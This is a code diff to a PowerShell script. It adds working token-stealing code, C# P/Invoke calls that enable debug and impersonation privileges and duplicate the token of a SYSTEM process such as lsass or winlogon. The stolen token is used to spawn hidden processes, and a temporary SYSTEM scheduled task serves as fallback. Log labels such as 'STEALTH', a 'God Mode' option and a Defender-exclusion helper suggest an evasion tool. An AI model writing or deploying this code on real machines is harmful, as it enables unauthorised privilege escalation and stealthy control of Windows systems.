@@ -1561,6 +1561,326 @@ function Get-CurrentUserSidInfo {
     return [PSCustomObject]@{ SID = $sid; IsAdmin = $adminCheck; IsBuiltInAdmin = ($sid -like "*-500") }
 }
 
+# --- Hybrid Token Stealing Elevation (Option 7 Enhancement) ---
+# Adds C# P/Invoke to duplicate a SYSTEM token from a running process and spawn
+# a new process with it. Falls back to scheduled-task elevation if token stealing fails.
+# This makes God Mode robust across different Windows builds where SYSTEM processes vary.
+
+$TokenOpsType = @"
+using System;
+using System.Runtime.InteropServices;
+using System.ComponentModel;
+
+public class TokenOps {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetCurrentProcess();
+
+    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
+    public const uint PROCESS_VM_READ = 0x0010;
+    public const uint TOKEN_DUPLICATE = 0x0002;
+    public const uint TOKEN_QUERY = 0x0008;
+    public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
+    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
+    public const uint TOKEN_ALL_ACCESS = 0xF01FF;
+
+    public const int SecurityImpersonation = 2;
+    public const int SecurityIdentification = 1;
+    public const int TokenPrimary = 1;
+    public const int TokenImpersonation = 2;
+
+    public const int LOGON_WITH_PROFILE = 1;
+    public const int LOGON_NETCREDENTIALS_ONLY = 2;
+
+    public const uint CREATE_NEW_CONSOLE = 0x00000010;
+    public const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
+    public const uint CREATE_NO_WINDOW = 0x08000000;
+
+    public const string SE_DEBUG_NAME = "SeDebugPrivilege";
+    public const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";
+    public const string SE_IMPERSONATE_NAME = "SeImpersonatePrivilege";
+
+    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID {
+        public uint LowPart;
+        public int HighPart;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID_AND_ATTRIBUTES {
+        public LUID Luid;
+        public uint Attributes;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct TOKEN_PRIVILEGES {
+        public uint PrivilegeCount;
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
+        public LUID_AND_ATTRIBUTES[] Privileges;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct STARTUPINFO {
+        public int cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public uint dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    public static bool EnablePrivilege(string privilegeName) {
+        IntPtr hToken = IntPtr.Zero;
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, out hToken)) {
+            return false;
+        }
+        try {
+            LUID luid;
+            if (!LookupPrivilegeValue(null, privilegeName, out luid)) return false;
+            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES {
+                PrivilegeCount = 1,
+                Privileges = new LUID_AND_ATTRIBUTES[3]
+            };
+            tp.Privileges[0].Luid = luid;
+            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+            return AdjustTokenPrivileges(hToken, false, ref tp, (uint)Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero);
+        } finally {
+            CloseHandle(hToken);
+        }
+    }
+
+    public static int CreateProcessFromToken(int pid, string appName, string cmdLine, bool hideWindow) {
+        IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
+        if (hProcess == IntPtr.Zero) return Marshal.GetLastWin32Error();
+        try {
+            IntPtr hToken = IntPtr.Zero;
+            if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken)) {
+                return Marshal.GetLastWin32Error();
+            }
+            try {
+                IntPtr hDupToken = IntPtr.Zero;
+                if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hDupToken)) {
+                    return Marshal.GetLastWin32Error();
+                }
+                try {
+                    STARTUPINFO si = new STARTUPINFO();
+                    si.cb = Marshal.SizeOf(si);
+                    si.lpDesktop = "WinSta0\\Default";
+                    if (hideWindow) {
+                        si.dwFlags = 0x00000001;
+                        si.wShowWindow = 0;
+                    }
+                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+                    uint creationFlags = CREATE_UNICODE_ENVIRONMENT;
+                    if (hideWindow) creationFlags |= CREATE_NO_WINDOW;
+                    else creationFlags |= CREATE_NEW_CONSOLE;
+
+                    string cmd = cmdLine;
+                    if (string.IsNullOrEmpty(cmd)) { cmd = appName; }
+
+                    if (!CreateProcessWithTokenW(hDupToken, 0, null, cmd, creationFlags, IntPtr.Zero, null, ref si, out pi)) {
+                        return Marshal.GetLastWin32Error();
+                    }
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                    return 0;
+                } finally {
+                    CloseHandle(hDupToken);
+                }
+            } finally {
+                CloseHandle(hToken);
+            }
+        } finally {
+            CloseHandle(hProcess);
+        }
+    }
+}
+"@
+
+try {
+    Add-Type -TypeDefinition $TokenOpsType -ErrorAction Stop
+} catch {
+    Write-Log -Message "TokenOps P/Invoke already loaded or compilation failed: $_" -Type "WARN" -Color Yellow
+}
+
+function Enable-ElevationPrivileges {
+    try {
+        [TokenOps]::EnablePrivilege([TokenOps]::SE_DEBUG_NAME) | Out-Null
+        [TokenOps]::EnablePrivilege([TokenOps]::SE_ASSIGNPRIMARYTOKEN_NAME) | Out-Null
+        [TokenOps]::EnablePrivilege([TokenOps]::SE_IMPERSONATE_NAME) | Out-Null
+        Write-DebugLog -FunctionName "Enable-ElevationPrivileges" -Action "EXIT" -Message "Privileges enabled"
+    } catch {
+        Write-DebugLog -FunctionName "Enable-ElevationPrivileges" -Action "ERROR" -Message "Failed to enable privileges" -ErrorRecord $_
+    }
+}
+
+function Find-SystemProcessCandidate {
+    param([int]$MaxScan = 30)
+    # Try well-known stable SYSTEM processes first (fast path)
+    $priorityNames = @("lsass.exe","services.exe","winlogon.exe","svchost.exe","MsMpEng.exe","SearchIndexer.exe")
+    foreach ($name in $priorityNames) {
+        $procs = Get-Process -Name ($name -replace '\.exe$','') -ErrorAction SilentlyContinue
+        foreach ($p in $procs) {
+            try {
+                $cim = Get-CimInstance Win32_Process -Filter "ProcessId=$($p.Id)" -ErrorAction SilentlyContinue
+                if ($cim) {
+                    $owner = ($cim | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
+                    if ($owner -eq "SYSTEM") { return $p.Id }
+                }
+            } catch {}
+        }
+    }
+    # Fallback: scan all processes via WMI and pick the first non-critical SYSTEM process
+    $excludeNames = @("System","Registry","smss.exe","csrss.exe","wininit.exe")
+    $allProcs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessId -gt 4 }
+    $scanned = 0
+    foreach ($proc in $allProcs) {
+        if ($scanned -ge $MaxScan) { break }
+        $scanned++
+        try {
+            $owner = ($proc | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
+            if ($owner -eq "SYSTEM" -and ($proc.Name -notin $excludeNames)) {
+                return $proc.ProcessId
+            }
+        } catch {}
+    }
+    return 0
+}
+
+function Start-ProcessWithStolenToken {
+    param(
+        [string]$Path,
+        [string]$Arguments = "",
+        [switch]$HideWindow
+    )
+    try {
+        Enable-ElevationPrivileges
+        $systemPid = Find-SystemProcessCandidate
+        if ($systemPid -eq 0) {
+            Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "ERROR" -Message "No suitable SYSTEM process found"
+            return $false
+        }
+        $cmd = "`"$Path`""
+        if ($Arguments) { $cmd += " $Arguments" }
+        $result = [TokenOps]::CreateProcessFromToken($systemPid, $Path, $cmd, [bool]$HideWindow)
+        if ($result -eq 0) {
+            Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "EXIT" -Message "Success PID=$systemPid"
+            return $true
+        } else {
+            $err = [ComponentModel.Win32Exception]$result
+            Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "ERROR" -Message "Win32 error $result ($($err.Message)) PID=$systemPid"
+            return $false
+        }
+    } catch {
+        Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "ERROR" -Message "Exception" -ErrorRecord $_
+        return $false
+    }
+}
+
+function Invoke-HybridElevation {
+    param(
+        [string]$Path,
+        [string]$Arguments = ""
+    )
+    if (-not (Test-Path $Path)) { return $false }
+    $procName = [System.IO.Path]::GetFileNameWithoutExtension($Path)
+
+    # Skip if an instance is already running as SYSTEM
+    if (Test-SystemProcessExists -ProcessName "$procName.exe") {
+        return $true
+    }
+
+    Write-Log -Message "Hybrid elevating: $Path $Arguments" -Type "STEALTH" -Color Gray
+
+    # --- Phase 1: Token stealing ---
+    $stolen = Start-ProcessWithStolenToken -Path $Path -Arguments $Arguments -HideWindow
+    if ($stolen) {
+        Write-Log -Message "Token-steal elevation succeeded for $procName" -Type "INFO" -Color Green
+        return $true
+    }
+
+    Write-Log -Message "Token-steal failed for $procName, falling back to scheduled task..." -Type "WARN" -Color Yellow
+
+    # --- Phase 2: Scheduled task fallback (original method) ---
+    try {
+        # Kill existing instances first so single-instance apps don't immediately exit
+        Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Milliseconds 800
+
+        $action = New-ScheduledTaskAction -Execute $Path -Argument $Arguments
+        $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" `
+            -LogonType ServiceAccount -RunLevel Highest
+        $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)
+
+        Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
+        Start-ScheduledTask -TaskName $tempTask
+
+        $started = $false
+        for ($i = 0; $i -lt 30; $i++) {
+            Start-Sleep -Milliseconds 100
+            $taskInfo = Get-ScheduledTask -TaskName $tempTask -ErrorAction SilentlyContinue
+            if ($taskInfo -and $taskInfo.State -eq "Running") {
+                $started = $true
+                break
+            }
+        }
+
+        Start-Sleep -Milliseconds 500
+        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+
+        if (-not $started) {
+            Write-Log -Message "Elevated task did not start: $Path" -Type "WARN" -Color Yellow
+            return $false
+        }
+        return $true
+    } catch {
+        Write-Log -Message "Failed to elevate: $Path | Exception: $($_.Exception.Message)" -Type "ERROR" -Color Red
+        return $false
+    }
+}
+
 # --- Helper: Add Defender Exclusion ---
 function Add-DefenderExclusion {
     param([string]$Path)
@@ -2242,51 +2562,10 @@ function Elevate-Process {
         [string]$Path,
         [string]$Arguments = ""
     )
-    if (-not (Test-Path $Path)) { return }
-
-    $procName = [System.IO.Path]::GetFileNameWithoutExtension($Path)
-
-    # Skip if an instance is already running as SYSTEM
-    if (Test-SystemProcessExists -ProcessName "$procName.exe") {
-        return
-    }
-
-    Write-Log -Message "Elevating: $Path $Arguments" -Type "STEALTH" -Color Gray
-
-    try {
-        # Kill existing instances first so single-instance apps (Chrome, Explorer, etc.)
-        # don't immediately exit when the new SYSTEM instance starts.
-        Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-        Start-Sleep -Milliseconds 800
-
-        $action = New-ScheduledTaskAction -Execute $Path -Argument $Arguments
-        $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" `
-            -LogonType ServiceAccount -RunLevel Highest
-        $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)
-
-        Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
-        Start-ScheduledTask -TaskName $tempTask
-
-        # Wait up to 3 seconds for the task to actually start running
-        $started = $false
-        for ($i = 0; $i -lt 30; $i++) {
-            Start-Sleep -Milliseconds 100
-            $taskInfo = Get-ScheduledTask -TaskName $tempTask -ErrorAction SilentlyContinue
-            if ($taskInfo -and $taskInfo.State -eq "Running") {
-                $started = $true
-                break
-            }
-        }
-
-        Start-Sleep -Milliseconds 500
-        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false -ErrorAction SilentlyContinue
-
-        if (-not $started) {
-            Write-Log -Message "Elevated task did not start: $Path" -Type "WARN" -Color Yellow
-        }
-    } catch {
-        Write-Log -Message "Failed to elevate: $Path | Exception: $($_.Exception.Message)" -Type "ERROR" -Color Red
-    }
+    # Hybrid elevation: token stealing first, scheduled task fallback.
+    # This centralizes all elevation logic so both Invoke-ExistingProcessElevation
+    # and Start-Monitoring automatically get the dual-path robustness.
+    $null = Invoke-HybridElevation -Path $Path -Arguments $Arguments
 }
 
 function Test-SystemProcessExists {
